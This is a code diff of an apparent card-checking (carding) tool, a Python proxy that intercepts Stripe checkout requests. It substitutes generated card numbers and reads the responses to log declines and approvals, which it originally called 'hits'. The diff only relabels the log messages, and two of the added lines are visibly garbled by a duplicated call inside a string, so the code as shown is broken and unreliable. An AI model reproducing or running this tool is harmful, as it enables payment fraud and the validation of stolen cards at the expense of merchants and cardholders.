@@ -62,7 +62,7 @@ def request_handler(req, req_body):
 					parsedbody["payment_method_data[card][exp_month]"] = gennedCC[1]
 					parsedbody["payment_method_data[card][exp_year]"] = gennedCC[2]
 
-				req.addToLogs("yellow:yellow:TRYING CARD: "+parsedbody["payment_method_data[card][number]"].replace(" ", "")+"|"+parsedbody["payment_method_data[card][exp_month]"]+"|"+parsedbody["payment_method_data[card][exp_year]"])
+				req.addToLogs("yellow:yellow:TESTING CARD: "+parsedbody["payment_method_data[card][number]"].replace(" ", "")+"|"+parsedbody["payment_method_data[card][exp_month]"]+"|"+parsedbody["payment_method_data[card][exp_year]"])
 
 				req_body = build_x_www_form_urlencoded(parsedbody).encode()
 			elif b"card[number]" in req_body:
@@ -84,7 +84,7 @@ def request_handler(req, req_body):
 					parsedbody["card[exp_month]"] = gennedCC[1]
 					parsedbody["card[exp_year]"] = gennedCC[2]
 
-				req.addToLogs("yellow:yellow:TRYING CARD: "+parsedbody["card[number]"].replace(" ", "")+"|"+parsedbody["card[exp_month]"]+"|"+parsedbody["card[exp_year]"])
+				req.addToLogs("yellow:yellow:req.addToLogs("yellow:yellow:TESTING CARD: "+parsedbody["card[number]"].replace(" ", "")+"|"+parsedbody["card[exp_month]"]+"|"+parsedbody["card[exp_year]"])
 
 				req_body = build_x_www_form_urlencoded(parsedbody).encode()
 			elif b"source_data[card][number]" in req_body:
@@ -106,7 +106,7 @@ def request_handler(req, req_body):
 					parsedbody["source_data[card][exp_month]"] = gennedCC[1]
 					parsedbody["source_data[card][exp_year]"] = gennedCC[2]
 
-				req.addToLogs("yellow:yellow:TRYING CARD: "+parsedbody["source_data[card][number]"].replace(" ", "")+"|"+parsedbody["source_data[card][exp_month]"]+"|"+parsedbody["source_data[card][exp_year]"])
+				req.addToLogs("yellow:yellow:req.addToLogs("yellow:yellow:TESTING CARD: "+parsedbody["source_data[card][number]"].replace(" ", "")+"|"+parsedbody["source_data[card][exp_month]"]+"|"+parsedbody["source_data[card][exp_year]"])
 
 				req_body = build_x_www_form_urlencoded(parsedbody).encode()
 		except Exception as e:
@@ -217,27 +217,27 @@ def response_handler(req, req_body, res, res_body):
 	try:
 		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_pages/"):
 			if b'"decline_code": "' in res_body:
-				req.addToLogs("red:red:CARD DECLINED : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
+				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
 			elif b'"code": "' in res_body:
-				req.addToLogs("red:red:CARD DECLINED : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
+				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
 			elif b'"completed": true' in res_body:
-				req.addToLogs('green:lime:HIT DETECTED')
+				req.addToLogs('green:lime:CARD APPROVED')
 			
 		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_intents/") and not req.path.split("://", 1)[1].endswith("verify_challenge"):
 			if b'"decline_code": "' in res_body:
-				req.addToLogs("red:red:CARD DECLINED : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
+				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
 			elif b'"code": "' in res_body:
-				req.addToLogs("red:red:CARD DECLINED : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
+				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
 			elif b'succeeded' in res_body:
-				req.addToLogs('green:lime:HIT DETECTED')
+				req.addToLogs('green:lime:CARD APPROVED')
 		
 		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/checkout/sessions/completed_webhook_delivered/"):
 			if b'"decline_code": "' in res_body:
-				req.addToLogs("red:red:CARD DECLINED : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
+				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
 			elif b'"code": "' in res_body:
-				req.addToLogs("red:red:CARD DECLINED : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
+				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
 			elif b'"completed": true' in res_body:
-				req.addToLogs('green:lime:HIT DETECTED')
+				req.addToLogs('green:lime:CARD APPROVED')
 	except Exception as e:
 		traceback.print_exc()
 		pass
